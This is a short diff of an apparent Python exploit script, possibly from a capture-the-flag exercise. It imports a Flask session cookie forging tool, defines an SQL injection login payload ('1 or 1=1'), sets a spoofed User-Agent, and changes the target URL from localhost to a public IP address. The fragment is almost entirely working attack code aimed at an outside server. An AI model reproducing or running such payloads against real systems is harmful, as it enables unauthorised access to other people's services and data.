@@ -6,7 +6,7 @@ from flask_session_cookie_manager3 import FSCM
 
 
 # In fact, we should use sqlmap first to check if SQL injection vulnerabilities exist
-url = 'http://127.0.0.1:5000/'
+url = 'http://106.14.163.104/'
 payload = 'login?Email=1%20or%201=1%20or%201=1'
 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE'
